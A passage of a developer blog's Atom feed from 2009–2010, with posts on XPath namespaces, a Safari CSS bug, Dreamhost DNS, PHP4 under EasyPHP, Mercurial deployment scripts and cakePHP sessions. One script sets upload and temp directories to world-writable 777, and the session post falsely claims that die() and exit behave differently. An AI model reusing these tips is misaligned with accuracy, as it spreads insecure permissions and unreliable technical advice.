&lt;p&gt;The admin panel should also allow anyone to modify one file metadata and
rewrite it back into the file as well as inside the database.&lt;/p&gt;

&lt;p&gt;This is kind of a big project for me, it&amp;#39;s been 2.5 months that I&amp;#39;m on it and
I had to learn everything from scrath : all the historical stuff, format
specs, recommendation as well as Coldfusion -the language the app is built on-&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve learn a lot until now and I still have 15 more days to finish it. The
main app is almost finished (I just have to polish on some edge cases) and
then I&amp;#39;ll have to integrate it in the existing admin panel.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Selecting node based on namespace in xPath</title>
   <link href="http://blog.pixelastic.com/2010/01/11/selecting-node-based-on-namespace-in-xpath/"/>
   <updated>2010-01-11T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/11/selecting-node-based-on-namespace-in-xpath</id>
   <content type="html">&lt;p&gt;I&amp;#39;m used to XPath, I use it in my Javascript dev (jQuery) has well as in my
cakePHP dev (the Set::extract() method), and I&amp;#39;ve always thought it was really
fast, powerful and readable.&lt;/p&gt;

&lt;p&gt;Today I had to parse a real-world XML file, and I discovered that when dealing
with namespaces, all became suddenly much more difficult in the XPath world.&lt;/p&gt;

&lt;p&gt;Here is my xml source (shortened for the sake of clarity) :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xpacket begin=&amp;quot;ï»¿&amp;quot; id=&amp;quot;W5M0MpCehiHzreSzNTczkc9d&amp;quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;x:xmpmeta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:x=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;adobe:ns:meta/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;rdf:RDF&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:rdf=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.w3.org/1999/02/22-rdf-syntax-ns#&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;nt&quot;&gt;&amp;lt;rdf:Description&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rdf:about=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:dc=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://purl.org/dc/elements/1.1/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:creator&amp;gt;&lt;/span&gt;Igor Gosstroff&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:creator&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:description&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xml:lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;x-default&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Awesome picture&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:description&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/rdf:Description&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;nt&quot;&gt;&amp;lt;rdf:Description&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rdf:about=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xmp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://ns.adobe.com/xap/1.0/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;xmp:Rating&amp;gt;&lt;/span&gt;4&lt;span class=&quot;nt&quot;&gt;&amp;lt;/xmp:Rating&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/rdf:Description&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/rdf:RDF&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/x:xmpmeta&amp;gt;&lt;/span&gt;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xpacket end=&amp;quot;w&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I wanted to select the first &lt;code&gt;&amp;lt;rdf:Description&amp;gt;&lt;/code&gt; (Dublin Core).&lt;/p&gt;

&lt;p&gt;First of all, you have to know that you can&amp;#39;t do //rdf:description, you have
to use a special syntax because the : is a reserved character. The solution is
using the name() method : //*[name()=&amp;#39;rdf:Description&amp;#39;].&lt;/p&gt;

&lt;p&gt;It will return both rdf:Description nodes. I can easily get the one i&amp;#39;m
interested in by doing //*[name()=&amp;#39;rdf:Description&amp;#39;][1] but I would have liked
to use a much more simple syntax and select the one with an xmlns:dc
attribute.&lt;/p&gt;

&lt;p&gt;And I did not find out how to do that. All the syntaxes I tried either
returned nothing, threw and exception and even crash my app once.&lt;/p&gt;

&lt;p&gt;I finally found a devious way to find it. I search for any xmlField whose
namespace uri was http://purl.org/dc/elements/1.1/ and then get its parent. I
still feel like its a dirty hack but I&amp;#39;ve allready spent too much time on it,
so it will be enough for now.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;//*[namespace-uri()=&amp;#39;http://purl.org/dc/elements/1.1/&amp;#39;][1]/../
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Safari input focusing problem</title>
   <link href="http://blog.pixelastic.com/2010/01/10/safari-input-focusing-problem/"/>
   <updated>2010-01-10T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2010/01/10/safari-input-focusing-problem</id>
   <content type="html">&lt;p&gt;I just ran into a strange behavior on Safari 3 (Win). I&amp;#39;m not quite sure what
caused this problem, but I tracked it down to one CSS rule.&lt;/p&gt;

&lt;p&gt;The thing was that I had an input field that moved whenever I tried to focus
it. It jump 3 pixels up whenever I gave him focus. I had never seen that
before.&lt;/p&gt;

&lt;p&gt;I finally managed to track it down to the padding:2px 0px 5px 0px;
declaration. I exploded it in four (-top, -right, -bottom and -left) and it
seemed that it was the padding-bottom:0px that cause the bug.&lt;/p&gt;

&lt;p&gt;I finally rewrote my css (in three lines instead of one) and moved to other
things.&lt;/p&gt;

&lt;p&gt;I post it here as a reminder, and hope it could help someone.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Freelancing, I miss you</title>
   <link href="http://blog.pixelastic.com/2009/12/16/freelancing-i-miss-you/"/>
   <updated>2009-12-16T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/12/16/freelancing-i-miss-you</id>
   <content type="html">&lt;p&gt;Well, it&amp;#39;s been one month and a half now that I&amp;#39;ve put my freelance activites
on hold. I&amp;#39;m in contract with a big company to develop an internal
application.&lt;/p&gt;

&lt;p&gt;The purpose of the application is really interesting, the guy I&amp;#39;m working with
is too, but the language I have to use as well as the all-administrative thing
of big companies like that is... well... let&amp;#39;s just say I LOVE being a
freelancer PHP developper.&lt;/p&gt;

&lt;p&gt;One more month and a half and it will be over. I allready have learn a lot
about metadatas in general and particularly Exif, Iptc and XMP. I&amp;#39;ve also
learned a little about Coldfusion. Enough to know that I won&amp;#39;t work with that
language again, unless I&amp;#39;m forced too.&lt;/p&gt;

&lt;p&gt;In the remaining week, I&amp;#39;ll also learn EXTJs, and this part seems promising. I
guess leaving jQuery and its easy syntax will be hard at first, but all the
data handling of EXTJs seems really powerful.&lt;/p&gt;

&lt;p&gt;Anyway, when that contract will be over, I&amp;#39;ll be back to Caracole and I have
so many ideas of features and whole websites that I want to create...&lt;/p&gt;

&lt;p&gt;I would like to make the admin panel of Caracole the one thing an
administrator would have to check to see if everything is going well on its
website. I allready have an extended &lt;code&gt;PHPInfo()&lt;/code&gt;highlighting possible
misconfiguration but I want to push that further by integrating Google
Analytics, checking the Gmail inbox associated as well as integrating the
PHPSec library.&lt;/p&gt;

&lt;p&gt;In the future I also plan on creating a photography website for Street Art and
graffitis, with gelocalisation, metadatas saving of the author and place,
possibility to upload photo directly from a mobile phone, etc&lt;/p&gt;

&lt;p&gt;The old ideas about my own personal website, a quizz website, or one for
rating driver&amp;#39;s ed are still in my mind. Wait and see.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Configuring a .fr with Dreamhost</title>
   <link href="http://blog.pixelastic.com/2009/10/29/configuring-a-fr-with-dreamhost/"/>
   <updated>2009-10-29T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/10/29/configuring-a-fr-with-dreamhost</id>
   <content type="html">&lt;p&gt;Hosting a website on a .fr is a little harder than a simple .com. The
&lt;a href=&quot;http://www.afnic.fr/&quot;&gt;Afnic&lt;/a&gt; (registry for the .fr domains) makes a check
whenever you change the DNS of your domain to make sure the new DNS can accept
the domain.&lt;/p&gt;

&lt;p&gt;They run a tool named &lt;a href=&quot;http://www.zonecheck.fr/&quot;&gt;ZoneCheck&lt;/a&gt; to do that. This
tool will request the new DNS server to test if they can accept the .fr. The
problem is that they make a request on the port 53, which is not open on
Dreamhost and thus the test fail and the Afnic refuse to let you change your
DNS.&lt;/p&gt;

&lt;p&gt;The alternative is to not change you DNS, and keep the default one of your
registrar, but manually edit the zones and copy the zones defined in your
dreamhost panel (In Domains &amp;gt; Your domain &amp;gt; DNS, at the bottom of the page)
into your zones.&lt;/p&gt;

&lt;p&gt;The most important part is modifying the default &lt;code&gt;A&lt;/code&gt; entry to the IP of your
dreamhost server. You should do the same for the &lt;code&gt;www A&lt;/code&gt;entry to.&lt;/p&gt;

&lt;p&gt;Create a &lt;code&gt;mysql A&lt;/code&gt;entry and a &lt;code&gt;ftp A&lt;/code&gt; entry if you want to use both
&lt;code&gt;ftp.domain.com&lt;/code&gt; and &lt;code&gt;mysql.domain.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I also changed the MX record to the google one, as well as creating a CNAME
webmail.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using both php4 and php5 with Easyphp</title>
   <link href="http://blog.pixelastic.com/2009/10/28/using-both-php4-and-php5-with-easyphp/"/>
   <updated>2009-10-28T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/10/28/using-both-php4-and-php5-with-easyphp</id>
   <content type="html">&lt;p&gt;I&amp;#39;m mostly developing on my Windows machine, using EasyPHP (combining Apache,
Mysql and PHP). Each version of EasyPHP is bundled with a specific version of
php.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m now almost exclusively developping with the sweetness of php5, but I still
have from time to time to refactor a piece of code on an legacy app running on
php4.&lt;/p&gt;

&lt;p&gt;I have finally found a way to make specific website to work on php4 instead of
php5 using the same install of EasyPHP.&lt;/p&gt;

&lt;p&gt;The key is : running php4 as a cgi script.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve finally found a way, by installing php4 as a cgi.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Download the &lt;a href=&quot;http://fr.php.net/releases/&quot;&gt;Windows binary of the version&lt;/a&gt; you want to emulate.&lt;/li&gt;
&lt;li&gt;Create a subdirectory named php4 in your EasyPHP/apache/cgi-bin/ directory&lt;/li&gt;
&lt;li&gt;Extract the php.exe, php4ts.dll, sapi/php4apache.dll, php.ini-recommended and the extensions directory in this new directory&lt;/li&gt;
&lt;li&gt;Rename php.ini-recommended to php.ini (this will be the php.ini used with php4)&lt;/li&gt;
&lt;li&gt;Edit your apache config file and add the line ScriptAlias /php4/ &amp;quot;${path}/apache/cgi-bin/php4/&amp;quot; after the allready defined ScriptAlias (~line 379)&lt;/li&gt;
&lt;li&gt;Create a new virtualhost for the website you would like to run in php4. Mine is as follow :&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Virtualhost&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*:80&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;ServerName&lt;/span&gt; foobar
 &lt;span class=&quot;nb&quot;&gt;ServerAdmin&lt;/span&gt; me@localhost
 &lt;span class=&quot;nb&quot;&gt;DocumentRoot&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;${path}/www/foobar.com&amp;quot;&lt;/span&gt;

 &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;${path}/www/foobar.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;Options&lt;/span&gt; Indexes FollowSymLinks Includes ExecCGI
 &lt;span class=&quot;nb&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;All&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
 &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;

 &lt;span class=&quot;nb&quot;&gt;AddHandler&lt;/span&gt; php4-script .php .html .htm
 &lt;span class=&quot;nb&quot;&gt;Action&lt;/span&gt;     php4-script &lt;span class=&quot;sx&quot;&gt;/php4/php.exe&lt;/span&gt;

 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Virtualhost&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This means that all .php, .html and .htm file of this virtualhost will be
parsed by the php.exe file in our /cgi-bin/php4 directory.&lt;/p&gt;

&lt;p&gt;Don&amp;#39;t forget to edit this php.ini if you want to tweak things, and remember
that extensions for this version are in the copied extensions/ directory.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>cakePHP deployment with Mercurial on Dreamhost</title>
   <link href="http://blog.pixelastic.com/2009/10/01/cakephp-deployment-with-mercurial-on-dreamhost/"/>
   <updated>2009-10-01T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2009/10/01/cakephp-deployment-with-mercurial-on-dreamhost</id>
   <content type="html">&lt;p&gt;I now use Mercurial on my daily work flow and have set up some methods on my
dev machine to ease the pain of installing mercurial and make it work on any
new webserver.&lt;/p&gt;

&lt;p&gt;Here are some snippets that automate all that stuff. You may have to change
one thing or two to accomodate your own setup.&lt;/p&gt;

&lt;p&gt;First, I create a custom &lt;code&gt;.bashrc&lt;/code&gt; file that I will put on the webserver and
create into the following method :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;hgInstall&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 mkdir -p ~/.packages/src
 &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.packages/src
 wget http://www.selenic.com/mercurial/release/mercurial-1.2.tar.gz
 tar xvzf mercurial-1.2.tar.gz
 &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;mercurial-1.2
 python setup.py install --home&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/.packages/
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;[ui]\nusername = Pixelastic &amp;lt;tim@mailastic.com&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; ~/.hgrc
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;err&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;extensions&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;hgext/hbisect&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;!&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;hgext.imerge&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;! &amp;gt;&amp;gt; ~/.hgrc

 . ~/.hgrc
 &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
 hg version
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let me explain. I first create a directory to store the packages I will
download (in this example I will only download one package, but as I don&amp;#39;t
like to have files all around my server, I just keep them in this place). I
will then download Mercurial 1.2 in this new directory, unzip it and install
it.&lt;/p&gt;

&lt;p&gt;Next step is configuring the default user and correcting some bugs with
Dreamhost trying to load non-existing extensions (&lt;code&gt;hgext/hbisec&lt;/code&gt;t and
&lt;code&gt;hgext.imerge&lt;/code&gt;). As I&amp;#39;ve made a change to &lt;code&gt;.hgrc&lt;/code&gt;, I reload it and get back to
the default directory while displaying hg version.&lt;/p&gt;

&lt;p&gt;That&amp;#39;s almost done, I also have to edit the .bash_profile and add the
following lines&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PYTHONPATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/.packages/lib/python
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/.packages/bin:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so this method will download, install on configure Hg on the Dreamhost
server. That&amp;#39;s all very well, but I had to manually setup the .bashrc, let&amp;#39;s
see if we cannot automate that as well.&lt;/p&gt;

&lt;p&gt;Now, I&amp;#39;m editing my .zsh&lt;em&gt;aliases on my local machine (or your .bash&lt;/em&gt;aliases if
you&amp;#39;re using bash) to add the following method&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;dreamhost&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 scp ~/Documents/Config/Dreamhost/.bashrc ~/Documents/Config/Dreamhost/.bash_profile &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;:~/
 ssh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;. ~/.bashrc&amp;#39;&lt;/span&gt;
 scp ~/.ssh/id_rsa.pub ~/Documents/Config/Dreamhost/.ssh/xpsfixe.pub &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;:~/
 ssh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;addKeys&amp;#39;&lt;/span&gt;
 scp ~/Documents/Config/Dreamhost/cakeClearCache.sh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;:~/
 ssh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;chmod +x ~/cakeClearCache.sh&amp;#39;&lt;/span&gt;
 ssh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;hgInstall&amp;#39;&lt;/span&gt;
 ssh &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, so this one is a little more complex. You have to call this method with
one paremeter, being the user@domain credentials to connect to your Dreamhost
server. What it will do is upload (using ssh) files from your local machine to
the server and then apply some commands on the machine using ssh.&lt;/p&gt;

&lt;p&gt;First it will upload both the local version .bashrc and .bash_profile that are
sitting on your dev machine and &amp;quot;reload&amp;quot; the .bashrc, allowing you to use the
previously defined hgInstall directly in the shell&lt;/p&gt;

&lt;p&gt;Then, it will upload your ssh key(s) to the server and add them to the list of
allowed keys (more on that later, just skip the addKeys line for now.)&lt;/p&gt;

&lt;p&gt;The next step is uploading (and giving the correct chmod) a special script
that will clear cakePHP cache (more on that later too)&lt;/p&gt;

&lt;p&gt;And the final step is calling the previously explained hgInstall method. So
the only thing you have to do is put this method in your .zsh_aliases (and the
corresponding keys, .bashrc and scripts in their corresponding places) then
run dreamhost() and Hg will be installed on your server.&lt;/p&gt;

&lt;p&gt;So now let me get back a little on the two details I skipped. The first is the
key stuff. What I&amp;#39;m doing is uploading your ssh key(s) to the server and then
calling addKeys. It will authorize those keys to connect using ssh without
having to type login/pass on each request. Here is the addKeys code (you have
to put it in your .bashrc file and modify the filename to your own)&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;addKeys&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 mkdir .ssh
 cat id_rsa.pub &amp;gt;&amp;gt; .ssh/authorized_keys
 cat xpsfixe.pub &amp;gt;&amp;gt; .ssh/authorized_keys
 rm id_rsa.pub
 rm xpsfixe.pub
 chmod go-w ~
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It will basically create the .ssh dir and authorized_keys file with your keys
info. It will then delete the files and set the correct chmod.&lt;/p&gt;

&lt;p&gt;And the second part was about that cache clearing thing. When you update your
app using Hg, you do not want to update the cache files created by Cake as
they contain filepath reference and are likely to be different between your
test and prod environment and would surely broke your whole app. So, you set
an ignore rule in the .hgignore about them like the following :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;syntax:glob
app/tmp/cache/cake_*
app/tmp/cache/views/*.php
app/tmp/cache/models/cake_*
app/tmp/cache/persistent/cake_*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It does work fine almost all the time, but it sometimes lead to errors as the
cache is not regenerated between each hg update. Sometimes you have to alter a
model schema or the way a value is stored in cache and if you don&amp;#39;t clear your
cache, it can yield to unexpected results as the data will be wrongly parsed
and used.&lt;/p&gt;

&lt;p&gt;So what i did to avoid that was to create a script that will clear the cache
for you. Here is the code (you have to be inside the project dir for this to
work)&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;app/tmp/cache
rm -f cake_*
rm -f views/*&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;php
rm -f models/cake_*
rm -f persistent/cake_*
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../../../
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It will remove all the cache files generated by cake that could interfere
after an update. You just have to wrap thoses lines in a method in your
.bashrc (mine is called cakeClearCache) and execute it after each update or
when you have caching issues.&lt;/p&gt;

&lt;p&gt;Well, I think you guessed that I did not stop here. Manually applying the
method after each update can be a little tedious. So I put the previous code
in a file named cakeClearCache.sh (you can spot that I uploaded this file in
the dreamhost() method earlie)r. I also added the following line to my
/project/.hg/hgrc on my server (if you don&amp;#39;t have this file, just create it,
it&amp;#39;s a project-based hg configuration file)&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;k&quot;&gt;[hooks]&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;~/cakeClearCache.sh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It means that everytime an hg update is done, the specified script is fired.
That&amp;#39;s really fine for us, it means that cache will be cleared on each update.
Sounds good.&lt;/p&gt;

&lt;p&gt;One last thing to do was creating the hgrc file automatically. That&amp;#39;s why I
created the following method (add it to the .bashrc file in the server). It is
just a wrapper that will create the hgrc file after doing an hg init&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;hgInitStart&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 hg init
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;[hooks]\nupdate = ~/cakeClearCache.sh&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; ./.hg/hgrc
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So instead of doing hg init, just do hgInitStart. You can then start cloning
your project here.&lt;/p&gt;

&lt;p&gt;And one last thing, I also created a method that will set correct chmod to
app/tmp and app/webroot/files&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;cakeCorrectChmod&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 chmod 777 ./app/tmp -R
 chmod 777 ./app/webroot/files -R
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And created a wrapper around it to call just after having cloned the project
that will update it and set the correct chmods&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;hgInitEnd&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
 hg update tip
 cakeCorrectChmod
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That&amp;#39;s all. I bet anyone slightly more experienced in shell scripting could do
better than that, but as I have struggled a little to get this right I thought
I could share it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Locked sessions in cakePHP</title>
   <link href="http://blog.pixelastic.com/2009/09/30/locked-sessions-in-cakephp/"/>
   <updated>2009-09-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2009/09/30/locked-sessions-in-cakephp</id>
   <content type="html">&lt;p&gt;I was working on a component heavily using session and was having trouble
debugging it. First I could&amp;#39;nt find where my session files where saved on my
server.&lt;/p&gt;

&lt;p&gt;Well, it was because I hadn&amp;#39;t set the session.save_path value in my php.ini.&lt;/p&gt;

&lt;p&gt;But now that is was done, it seems like I had locked sessions files that I
wasn&amp;#39;t able to access (I couldn&amp;#39;t even read them using a editor). The problem
was that I was using die() in my component script to help debugging the
process.&lt;/p&gt;

&lt;p&gt;And that was BAD. die() stopped the whole process, even if the session file
was opened for writing, locking it until the process died. What was the
correct way to halt my script was using exit;&lt;/p&gt;

&lt;p&gt;Hope that helped&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Polices de caractÃ¨re !</title>
   <link href="http://blog.pixelastic.com/2009/09/02/polices-de-caractere/"/>
   <updated>2009-09-02T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2009/09/02/polices-de-caractere</id>
   <content type="html">&lt;p&gt;Ah elles en ont du caractÃ¨re ces polices ! Elle m&amp;#39;en font voir de toutes les
couleurs...&lt;/p&gt;

&lt;p&gt;Pour l&amp;#39;intÃ©gration sur laquelle je travaille, certains titres utilisent une
police spÃ©ciale, et pour intÃ©grer Ã§a grÃ¢ce ) @font-face et Cufon, il me faut
les fichiers de police sous diffÃ©rents formats.&lt;/p&gt;

&lt;p&gt;La graphiste m&amp;#39;a fournie la police, sous format .dfont (package de plusieurs
font Ã  la sauce Mac). J&amp;#39;ai pu extraire le package grÃ¢ce Ã 
